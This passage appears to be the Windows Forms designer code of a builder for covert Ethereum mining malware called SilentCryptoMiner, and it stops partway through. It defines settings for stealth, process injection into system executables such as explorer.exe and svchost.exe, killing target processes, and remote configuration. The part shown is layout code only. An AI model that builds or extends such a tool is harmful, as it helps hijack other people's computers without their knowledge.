using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace SilentCryptoMiner
{
    [DesignerGenerated()]
    public partial class MinerETH : Form
    {

        // Form overrides dispose to clean up the component list.
        [DebuggerNonUserCode()]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components is object)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        // Required by the Windows Form Designer
        private System.ComponentModel.IContainer components;

        // NOTE: The following procedure is required by the Windows Form Designer
        // It can be modified using the Windows Form Designer.  
        // Do not modify it using the code editor.
        [DebuggerStepThrough()]
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MinerETH));
            this.BackgroundWorker2 = new System.ComponentModel.BackgroundWorker();
            this.formMinerETH = new MephTheme();
            this.tabcontrolMinerETH = new MephTabcontrol();
            this.tabConnection = new System.Windows.Forms.TabPage();
            this.groupOptional = new MephGroupBox();
            this.Label14 = new System.Windows.Forms.Label();
            this.txtPoolPassowrd = new MephTextBox();
            this.Label7 = new System.Windows.Forms.Label();
            this.txtPoolWorker = new MephTextBox();
            this.txtPoolData = new MephTextBox();
            this.Label12 = new System.Windows.Forms.Label();
            this.groupRequired = new MephGroupBox();
            this.txtPoolURL = new MephTextBox();
            this.Label6 = new System.Windows.Forms.Label();
            this.txtPoolUsername = new MephTextBox();
            this.Label8 = new System.Windows.Forms.Label();
            this.comboPoolScheme = new MephComboBox();
            this.Label3 = new System.Windows.Forms.Label();
            this.tabMining = new System.Windows.Forms.TabPage();
            this.label32 = new System.Windows.Forms.Label();
            this.toggleProcessKiller = new MephToggleSwitch();
            this.label29 = new System.Windows.Forms.Label();
            this.comboAlgorithm = new MephComboBox();
            this.comboIdleGPU = new MephComboBox();
            this.comboMaxGPU = new MephComboBox();
            this.Label22 = new System.Windows.Forms.Label();
            this.Label16 = new System.Windows.Forms.Label();
            this.Label5 = new System.Windows.Forms.Label();
            this.comboInjection = new MephComboBox();
            this.Label27 = new System.Windows.Forms.Label();
            this.toggleStealth = new MephToggleSwitch();
            this.Label24 = new System.Windows.Forms.Label();
            this.Label23 = new System.Windows.Forms.Label();
            this.txtIdleWait = new MephTextBox();
            this.Label11 = new System.Windows.Forms.Label();
            this.toggleIdle = new MephToggleSwitch();
            this.tabAdvanced = new System.Windows.Forms.TabPage();
            this.chkAPI = new MephCheckBox();
            this.txtAPI = new MephTextBox();
            this.label19 = new System.Windows.Forms.Label();
            this.txtKillTargets = new MephTextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.txtStealthTargets = new MephTextBox();
            this.chkAdvParam = new MephCheckBox();
            this.txtAdvParam = new MephTextBox();
            this.chkRemoteConfig = new MephCheckBox();
            this.txtRemoteConfig = new MephTextBox();
            this.tabJSON = new System.Windows.Forms.TabPage();
            this.txtJSON = new MephTextBox();
            this.formMinerETH.SuspendLayout();
            this.tabcontrolMinerETH.SuspendLayout();
            this.tabConnection.SuspendLayout();
            this.groupOptional.SuspendLayout();
            this.groupRequired.SuspendLayout();
            this.tabMining.SuspendLayout();
            this.tabAdvanced.SuspendLayout();
            this.tabJSON.SuspendLayout();
            this.SuspendLayout();
            // 
            // formMinerETH
            // 
            this.formMinerETH.AccentColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(192)))), ((int)(((byte)(0)))));
            this.formMinerETH.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.formMinerETH.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.formMinerETH.Controls.Add(this.tabcontrolMinerETH);
            this.formMinerETH.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.formMinerETH.ForeColor = System.Drawing.Color.Gray;
            this.formMinerETH.Location = new System.Drawing.Point(0, 0);
            this.formMinerETH.Margin = new System.Windows.Forms.Padding(2);
            this.formMinerETH.MaximumSize = new System.Drawing.Size(535, 272);
            this.formMinerETH.MinimumSize = new System.Drawing.Size(535, 272);
            this.formMinerETH.Name = "formMinerETH";
            this.formMinerETH.Size = new System.Drawing.Size(535, 272);
            this.formMinerETH.SubHeader = "Create a new miner (ethminer)";
            this.formMinerETH.TabIndex = 0;
            this.formMinerETH.Text = "Create New Miner";
            // 
            // tabcontrolMinerETH
            // 
            this.tabcontrolMinerETH.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.tabcontrolMinerETH.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.tabcontrolMinerETH.Controls.Add(this.tabConnection);
            this.tabcontrolMinerETH.Controls.Add(this.tabMining);
            this.tabcontrolMinerETH.Controls.Add(this.tabAdvanced);
            this.tabcontrolMinerETH.Controls.Add(this.tabJSON);
            this.tabcontrolMinerETH.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.tabcontrolMinerETH.ItemSize = new System.Drawing.Size(32, 85);
            this.tabcontrolMinerETH.Location = new System.Drawing.Point(12, 65);
            this.tabcontrolMinerETH.Multiline = true;
            this.tabcontrolMinerETH.Name = "tabcontrolMinerETH";
            this.tabcontrolMinerETH.SelectedIndex = 0;
            this.tabcontrolMinerETH.Size = new System.Drawing.Size(511, 197);
            this.tabcontrolMinerETH.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.tabcontrolMinerETH.TabIndex = 17;
            this.tabcontrolMinerETH.SelectedIndexChanged += new System.EventHandler(this.tabcontrolMinerETH_SelectedIndexChanged);
            // 
            // tabConnection
            // 
            this.tabConnection.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabConnection.Controls.Add(this.groupOptional);
            this.tabConnection.Controls.Add(this.groupRequired);
            this.tabConnection.Location = new System.Drawing.Point(89, 4);
            this.tabConnection.Name = "tabConnection";
            this.tabConnection.Size = new System.Drawing.Size(418, 189);
            this.tabConnection.TabIndex = 0;
            this.tabConnection.Text = "Connection";
            // 
            // groupOptional
            // 
            this.groupOptional.BackColor = System.Drawing.Color.Transparent;
            this.groupOptional.Controls.Add(this.Label14);
            this.groupOptional.Controls.Add(this.txtPoolPassowrd);
            this.groupOptional.Controls.Add(this.Label7);
            this.groupOptional.Controls.Add(this.txtPoolWorker);
            this.groupOptional.Controls.Add(this.txtPoolData);
            this.groupOptional.Controls.Add(this.Label12);
            this.groupOptional.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.groupOptional.Header_Line = MephGroupBox.HeaderLine.Enabled;
            this.groupOptional.Location = new System.Drawing.Point(213, 3);
            this.groupOptional.Name = "groupOptional";
            this.groupOptional.Size = new System.Drawing.Size(202, 183);
            this.groupOptional.TabIndex = 50;
            this.groupOptional.Text = "Optional Settings";
            // 
            // Label14
            // 
            this.Label14.AutoSize = true;
            this.Label14.Location = new System.Drawing.Point(10, 35);
            this.Label14.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label14.Name = "Label14";
            this.Label14.Size = new System.Drawing.Size(92, 17);
            this.Label14.TabIndex = 47;
            this.Label14.Text = "Worker Name:";
            // 
            // txtPoolPassowrd
            // 
            this.txtPoolPassowrd.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolPassowrd.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolPassowrd.Location = new System.Drawing.Point(13, 101);
            this.txtPoolPassowrd.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolPassowrd.MaxLength = 32767;
            this.txtPoolPassowrd.MultiLine = false;
            this.txtPoolPassowrd.Name = "txtPoolPassowrd";
            this.txtPoolPassowrd.Size = new System.Drawing.Size(179, 24);
            this.txtPoolPassowrd.TabIndex = 12;
            this.txtPoolPassowrd.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolPassowrd.UseSystemPasswordChar = false;
            this.txtPoolPassowrd.WordWrap = false;
            // 
            // Label7
            // 
            this.Label7.AutoSize = true;
            this.Label7.Location = new System.Drawing.Point(10, 82);
            this.Label7.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label7.Name = "Label7";
            this.Label7.Size = new System.Drawing.Size(67, 17);
            this.Label7.TabIndex = 13;
            this.Label7.Text = "Password:";
            // 
            // txtPoolWorker
            // 
            this.txtPoolWorker.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolWorker.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolWorker.Location = new System.Drawing.Point(13, 54);
            this.txtPoolWorker.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolWorker.MaxLength = 32767;
            this.txtPoolWorker.MultiLine = false;
            this.txtPoolWorker.Name = "txtPoolWorker";
            this.txtPoolWorker.Size = new System.Drawing.Size(179, 24);
            this.txtPoolWorker.TabIndex = 46;
            this.txtPoolWorker.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolWorker.UseSystemPasswordChar = false;
            this.txtPoolWorker.WordWrap = false;
            // 
            // txtPoolData
            // 
            this.txtPoolData.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolData.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolData.Location = new System.Drawing.Point(13, 147);
            this.txtPoolData.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolData.MaxLength = 32767;
            this.txtPoolData.MultiLine = false;
            this.txtPoolData.Name = "txtPoolData";
            this.txtPoolData.Size = new System.Drawing.Size(179, 24);
            this.txtPoolData.TabIndex = 43;
            this.txtPoolData.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolData.UseSystemPasswordChar = false;
            this.txtPoolData.WordWrap = false;
            // 
            // Label12
            // 
            this.Label12.AutoSize = true;
            this.Label12.Location = new System.Drawing.Point(11, 127);
            this.Label12.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label12.Name = "Label12";
            this.Label12.Size = new System.Drawing.Size(70, 17);
            this.Label12.TabIndex = 44;
            this.Label12.Text = "Extra data:";
            // 
            // groupRequired
            // 
            this.groupRequired.BackColor = System.Drawing.Color.Transparent;
            this.groupRequired.Controls.Add(this.txtPoolURL);
            this.groupRequired.Controls.Add(this.Label6);
            this.groupRequired.Controls.Add(this.txtPoolUsername);
            this.groupRequired.Controls.Add(this.Label8);
            this.groupRequired.Controls.Add(this.comboPoolScheme);
            this.groupRequired.Controls.Add(this.Label3);
            this.groupRequired.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.groupRequired.Header_Line = MephGroupBox.HeaderLine.Enabled;
            this.groupRequired.Location = new System.Drawing.Point(5, 3);
            this.groupRequired.Name = "groupRequired";
            this.groupRequired.Size = new System.Drawing.Size(202, 183);
            this.groupRequired.TabIndex = 49;
            this.groupRequired.Text = "Required Settings";
            // 
            // txtPoolURL
            // 
            this.txtPoolURL.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolURL.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolURL.Location = new System.Drawing.Point(8, 101);
            this.txtPoolURL.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolURL.MaxLength = 32767;
            this.txtPoolURL.MultiLine = false;
            this.txtPoolURL.Name = "txtPoolURL";
            this.txtPoolURL.Size = new System.Drawing.Size(179, 24);
            this.txtPoolURL.TabIndex = 14;
            this.txtPoolURL.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolURL.UseSystemPasswordChar = false;
            this.txtPoolURL.WordWrap = false;
            // 
            // Label6
            // 
            this.Label6.AutoSize = true;
            this.Label6.Location = new System.Drawing.Point(6, 128);
            this.Label6.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label6.Name = "Label6";
            this.Label6.Size = new System.Drawing.Size(98, 17);
            this.Label6.TabIndex = 11;
            this.Label6.Text = "Wallet Address:";
            // 
            // txtPoolUsername
            // 
            this.txtPoolUsername.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolUsername.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolUsername.Location = new System.Drawing.Point(9, 147);
            this.txtPoolUsername.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolUsername.MaxLength = 32767;
            this.txtPoolUsername.MultiLine = false;
            this.txtPoolUsername.Name = "txtPoolUsername";
            this.txtPoolUsername.Size = new System.Drawing.Size(179, 24);
            this.txtPoolUsername.TabIndex = 10;
            this.txtPoolUsername.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolUsername.UseSystemPasswordChar = false;
            this.txtPoolUsername.WordWrap = false;
            // 
            // Label8
            // 
            this.Label8.AutoSize = true;
            this.Label8.Location = new System.Drawing.Point(6, 82);
            this.Label8.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label8.Name = "Label8";
            this.Label8.Size = new System.Drawing.Size(37, 17);
            this.Label8.TabIndex = 15;
            this.Label8.Text = "Pool:";
            // 
            // comboPoolScheme
            // 
            this.comboPoolScheme.BackColor = System.Drawing.Color.Transparent;
            this.comboPoolScheme.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboPoolScheme.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboPoolScheme.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboPoolScheme.ForeColor = System.Drawing.Color.Silver;
            this.comboPoolScheme.FormattingEnabled = true;
            this.comboPoolScheme.ItemHeight = 16;
            this.comboPoolScheme.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboPoolScheme.Items.AddRange(new object[] {
            "stratum (Standard)",
            "stratums (SSL/TLS)",
            "stratumss (SSL/TLS 1.2)",
            "http (getwork, proxy)"});
            this.comboPoolScheme.Location = new System.Drawing.Point(8, 56);
            this.comboPoolScheme.Margin = new System.Windows.Forms.Padding(2);
            this.comboPoolScheme.Name = "comboPoolScheme";
            this.comboPoolScheme.Size = new System.Drawing.Size(179, 22);
            this.comboPoolScheme.StartIndex = 0;
            this.comboPoolScheme.TabIndex = 40;
            // 
            // Label3
            // 
            this.Label3.AutoSize = true;
            this.Label3.Location = new System.Drawing.Point(5, 36);
            this.Label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label3.Name = "Label3";
            this.Label3.Size = new System.Drawing.Size(125, 17);
            this.Label3.TabIndex = 41;
            this.Label3.Text = "Connection Scheme:";
            // 
            // tabMining
            // 
            this.tabMining.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabMining.Controls.Add(this.label32);
            this.tabMining.Controls.Add(this.toggleProcessKiller);
            this.tabMining.Controls.Add(this.label29);
            this.tabMining.Controls.Add(this.comboAlgorithm);
            this.tabMining.Controls.Add(this.comboIdleGPU);
            this.tabMining.Controls.Add(this.comboMaxGPU);
            this.tabMining.Controls.Add(this.Label22);
            this.tabMining.Controls.Add(this.Label16);
            this.tabMining.Controls.Add(this.Label5);
            this.tabMining.Controls.Add(this.comboInjection);
            this.tabMining.Controls.Add(this.Label27);
            this.tabMining.Controls.Add(this.toggleStealth);
            this.tabMining.Controls.Add(this.Label24);
            this.tabMining.Controls.Add(this.Label23);
            this.tabMining.Controls.Add(this.txtIdleWait);
            this.tabMining.Controls.Add(this.Label11);
            this.tabMining.Controls.Add(this.toggleIdle);
            this.tabMining.Location = new System.Drawing.Point(89, 4);
            this.tabMining.Name = "tabMining";
            this.tabMining.Padding = new System.Windows.Forms.Padding(3);
            this.tabMining.Size = new System.Drawing.Size(418, 189);
            this.tabMining.TabIndex = 5;
            this.tabMining.Text = "Mining";
            // 
            // label32
            // 
            this.label32.AutoSize = true;
            this.label32.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.label32.Location = new System.Drawing.Point(10, 42);
            this.label32.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label32.Name = "label32";
            this.label32.Size = new System.Drawing.Size(89, 17);
            this.label32.TabIndex = 141;
            this.label32.Text = "Process Killer:";
            // 
            // toggleProcessKiller
            // 
            this.toggleProcessKiller.BackColor = System.Drawing.Color.Transparent;
            this.toggleProcessKiller.Checked = false;
            this.toggleProcessKiller.ForeColor = System.Drawing.Color.Black;
            this.toggleProcessKiller.Location = new System.Drawing.Point(111, 38);
            this.toggleProcessKiller.Margin = new System.Windows.Forms.Padding(2);
            this.toggleProcessKiller.Name = "toggleProcessKiller";
            this.toggleProcessKiller.Size = new System.Drawing.Size(50, 24);
            this.toggleProcessKiller.TabIndex = 140;
            // 
            // label29
            // 
            this.label29.AutoSize = true;
            this.label29.Location = new System.Drawing.Point(253, 140);
            this.label29.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label29.Name = "label29";
            this.label29.Size = new System.Drawing.Size(68, 17);
            this.label29.TabIndex = 68;
            this.label29.Text = "Algorithm:";
            // 
            // comboAlgorithm
            // 
            this.comboAlgorithm.BackColor = System.Drawing.Color.Transparent;
            this.comboAlgorithm.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboAlgorithm.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboAlgorithm.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboAlgorithm.ForeColor = System.Drawing.Color.Silver;
            this.comboAlgorithm.FormattingEnabled = true;
            this.comboAlgorithm.ItemHeight = 16;
            this.comboAlgorithm.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboAlgorithm.Items.AddRange(new object[] {
            "ethash",
            "etchash"});
            this.comboAlgorithm.Location = new System.Drawing.Point(256, 159);
            this.comboAlgorithm.Margin = new System.Windows.Forms.Padding(2);
            this.comboAlgorithm.Name = "comboAlgorithm";
            this.comboAlgorithm.Size = new System.Drawing.Size(147, 22);
            this.comboAlgorithm.StartIndex = 0;
            this.comboAlgorithm.TabIndex = 67;
            this.comboAlgorithm.SelectedIndexChanged += new System.EventHandler(this.comboAlgorithm_SelectedIndexChanged);
            // 
            // comboIdleGPU
            // 
            this.comboIdleGPU.BackColor = System.Drawing.Color.Transparent;
            this.comboIdleGPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboIdleGPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboIdleGPU.Font = new System.Drawing.Font("Verdana", 8F);
            this.comboIdleGPU.ForeColor = System.Drawing.Color.Silver;
            this.comboIdleGPU.FormattingEnabled = true;
            this.comboIdleGPU.ItemHeight = 16;
            this.comboIdleGPU.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboIdleGPU.Items.AddRange(new object[] {
            "0%",
            "10%",
            "20%",
            "30%",
            "40%",
            "50%",
            "60%",
            "70%",
            "80%",
            "90%",
            "100%"});
            this.comboIdleGPU.Location = new System.Drawing.Point(346, 70);
            this.comboIdleGPU.Name = "comboIdleGPU";
            this.comboIdleGPU.Size = new System.Drawing.Size(60, 22);
            this.comboIdleGPU.StartIndex = 10;
            this.comboIdleGPU.TabIndex = 66;
            // 
            // comboMaxGPU
            // 
            this.comboMaxGPU.BackColor = System.Drawing.Color.Transparent;
            this.comboMaxGPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboMaxGPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboMaxGPU.Font = new System.Drawing.Font("Verdana", 8F);
            this.comboMaxGPU.ForeColor = System.Drawing.Color.Silver;
            this.comboMaxGPU.FormattingEnabled = true;
            this.comboMaxGPU.ItemHeight = 16;
            this.comboMaxGPU.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboMaxGPU.Items.AddRange(new object[] {
            "0%",
            "10%",
            "20%",
            "30%",
            "40%",
            "50%",
            "60%",
            "70%",
            "80%",
            "90%",
            "100%"});
            this.comboMaxGPU.Location = new System.Drawing.Point(346, 40);
            this.comboMaxGPU.Name = "comboMaxGPU";
            this.comboMaxGPU.Size = new System.Drawing.Size(60, 22);
            this.comboMaxGPU.StartIndex = 10;
            this.comboMaxGPU.TabIndex = 65;
            // 
            // Label22
            // 
            this.Label22.AutoSize = true;
            this.Label22.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label22.Location = new System.Drawing.Point(256, 72);
            this.Label22.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label22.Name = "Label22";
            this.Label22.Size = new System.Drawing.Size(61, 17);
            this.Label22.TabIndex = 63;
            this.Label22.Text = "Idle GPU:";
            // 
            // Label16
            // 
            this.Label16.AutoSize = true;
            this.Label16.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label16.Location = new System.Drawing.Point(256, 41);
            this.Label16.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label16.Name = "Label16";
            this.Label16.Size = new System.Drawing.Size(65, 17);
            this.Label16.TabIndex = 61;
            this.Label16.Text = "Max GPU:";
            // 
            // Label5
            // 
            this.Label5.AutoSize = true;
            this.Label5.Location = new System.Drawing.Point(10, 140);
            this.Label5.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label5.Name = "Label5";
            this.Label5.Size = new System.Drawing.Size(67, 17);
            this.Label5.TabIndex = 59;
            this.Label5.Text = "Inject Into:";
            // 
            // comboInjection
            // 
            this.comboInjection.BackColor = System.Drawing.Color.Transparent;
            this.comboInjection.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboInjection.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboInjection.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboInjection.ForeColor = System.Drawing.Color.Silver;
            this.comboInjection.FormattingEnabled = true;
            this.comboInjection.ItemHeight = 16;
            this.comboInjection.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboInjection.Items.AddRange(new object[] {
            "explorer.exe",
            "nslookup.exe",
            "cmd.exe",
            "notepad.exe",
            "svchost.exe",
            "conhost.exe"});
            this.comboInjection.Location = new System.Drawing.Point(13, 159);
            this.comboInjection.Margin = new System.Windows.Forms.Padding(2);
            this.comboInjection.Name = "comboInjection";
            this.comboInjection.Size = new System.Drawing.Size(148, 22);
            this.comboInjection.StartIndex = 0;
            this.comboInjection.TabIndex = 58;
            // 
            // Label27
            // 
            this.Label27.AutoSize = true;
            this.Label27.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label27.Location = new System.Drawing.Point(10, 16);
            this.Label27.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label27.Name = "Label27";
            this.Label27.Size = new System.Drawing.Size(50, 17);
            this.Label27.TabIndex = 56;
            this.Label27.Text = "Stealth:";
            // 
            // toggleStealth
            // 
            this.toggleStealth.BackColor = System.Drawing.Color.Transparent;
            this.toggleStealth.Checked = false;
            this.toggleStealth.ForeColor = System.Drawing.Color.Black;
            this.toggleStealth.Location = new System.Drawing.Point(111, 11);
            this.toggleStealth.Margin = new System.Windows.Forms.Padding(2);
            this.toggleStealth.Name = "toggleStealth";
            this.toggleStealth.Size = new System.Drawing.Size(50, 24);
            this.toggleStealth.TabIndex = 55;
            this.toggleStealth.Text = "Enable Nicehash Mining";
            // 
            // Label24
            // 
            this.Label24.AutoSize = true;
            this.Label24.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label24.Location = new System.Drawing.Point(357, 101);
            this.Label24.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label24.Name = "Label24";
            this.Label24.Size = new System.Drawing.Size(54, 17);
            this.Label24.TabIndex = 53;
            this.Label24.Text = "Minutes";
            // 
            // Label23
            // 
            this.Label23.AutoSize = true;
            this.Label23.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label23.Location = new System.Drawing.Point(256, 101);
            this.Label23.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label23.Name = "Label23";
            this.Label23.Size = new System.Drawing.Size(61, 17);
            this.Label23.TabIndex = 52;
            this.Label23.Text = "Idle Wait:";
            // 
            // txtIdleWait
            // 
            this.txtIdleWait.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtIdleWait.Enabled = false;
            this.txtIdleWait.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtIdleWait.ForeColor = System.Drawing.Color.Silver;
            this.txtIdleWait.Location = new System.Drawing.Point(331, 99);
            this.txtIdleWait.MaxLength = 32767;
            this.txtIdleWait.MultiLine = false;
            this.txtIdleWait.Name = "txtIdleWait";
            this.txtIdleWait.Size = new System.Drawing.Size(24, 24);
            this.txtIdleWait.TabIndex = 51;
            this.txtIdleWait.Text = "5";
            this.txtIdleWait.TextAlignment = System.Windows.Forms.HorizontalAlignment.Right;
            this.txtIdleWait.UseSystemPasswordChar = false;
            this.txtIdleWait.WordWrap = false;
            // 
            // Label11
            // 
            this.Label11.AutoSize = true;
            this.Label11.Location = new System.Drawing.Point(255, 13);
            this.Label11.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label11.Name = "Label11";
            this.Label11.Size = new System.Drawing.Size(76, 17);
            this.Label11.TabIndex = 30;
            this.Label11.Text = "Idle Mining:";
            // 
            // toggleIdle
            // 
            this.toggleIdle.BackColor = System.Drawing.Color.Transparent;
            this.toggleIdle.Checked = false;
            this.toggleIdle.ForeColor = System.Drawing.Color.Black;
            this.toggleIdle.Location = new System.Drawing.Point(356, 11);
            this.toggleIdle.Margin = new System.Windows.Forms.Padding(2);
            this.toggleIdle.Name = "toggleIdle";
            this.toggleIdle.Size = new System.Drawing.Size(50, 24);
            this.toggleIdle.TabIndex = 29;
            this.toggleIdle.Text = "Enable Idle Mining";
            this.toggleIdle.CheckedChanged += new MephToggleSwitch.CheckedChangedEventHandler(this.toggleIdle_CheckedChanged);
            // 
            // tabAdvanced
            // 
            this.tabAdvanced.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabAdvanced.Controls.Add(this.chkAPI);
            this.tabAdvanced.Controls.Add(this.txtAPI);
            this.tabAdvanced.Controls.Add(this.label19);
            this.tabAdvanced.Controls.Add(this.txtKillTargets);
            this.tabAdvanced.Controls.Add(this.label1);
            this.tabAdvanced.Controls.Add(this.txtStealthTargets);
            this.tabAdvanced.Controls.Add(this.chkAdvParam);
            this.tabAdvanced.Controls.Add(this.txtAdvParam);
            this.tabAdvanced.Controls.Add(this.chkRemoteConfig);
            this.tabAdvanced.Controls.Add(this.txtRemoteConfig);
            this.tabAdvanced.Location = new System.Drawing.Point(89, 4);
            this.tabAdvanced.Name = "tabAdvanced";
            this.tabAdvanced.Size = new System.Drawing.Size(418, 189);
            this.tabAdvanced.TabIndex = 6;
            this.tabAdvanced.Text = "Advanced";
            // 
            // chkAPI
            // 
            this.chkAPI.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAPI.BackColor = System.Drawing.Color.Transparent;
            this.chkAPI.Checked = false;
            this.chkAPI.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAPI.ForeColor = System.Drawing.Color.Black;
            this.chkAPI.Location = new System.Drawing.Point(228, 125);
            this.chkAPI.Margin = new System.Windows.Forms.Padding(2);
            this.chkAPI.Name = "chkAPI";
            this.chkAPI.Size = new System.Drawing.Size(178, 24);
            this.chkAPI.TabIndex = 141;
            this.chkAPI.Text = "API Endpoint URL";
            this.chkAPI.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAPI_CheckedChanged);
            // 
            // txtAPI
            // 
            this.txtAPI.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAPI.Enabled = false;
            this.txtAPI.ForeColor = System.Drawing.Color.Silver;
            this.txtAPI.Location = new System.Drawing.Point(228, 153);
            this.txtAPI.Margin = new System.Windows.Forms.Padding(2);
            this.txtAPI.MaxLength = 32767;
            this.txtAPI.MultiLine = false;
            this.txtAPI.Name = "txtAPI";
            this.txtAPI.Size = new System.Drawing.Size(178, 24);
            this.txtAPI.TabIndex = 140;
            this.txtAPI.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAPI.UseSystemPasswordChar = false;
            this.txtAPI.WordWrap = false;
            // 
            // label19
            // 
            this.label19.AutoSize = true;
            this.label19.BackColor = System.Drawing.Color.Transparent;
            this.label19.ForeColor = System.Drawing.Color.Gray;
            this.label19.Location = new System.Drawing.Point(13, 132);
